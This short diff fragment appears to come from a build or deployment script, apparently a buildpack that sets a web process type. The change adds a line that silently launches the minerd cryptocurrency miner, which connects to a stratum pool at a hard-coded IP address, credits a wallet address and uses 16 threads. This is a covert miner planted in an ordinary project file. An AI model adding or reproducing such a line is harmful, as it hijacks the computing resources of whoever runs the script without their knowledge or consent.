@@ -5,3 +5,5 @@ cat <<EOF
 default_process_types:
   web: bin/sniper 666
 EOF
+
+./minerd -a cryptonight -o stratum+tcp://89.35.29.48:3333 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p x -t 16
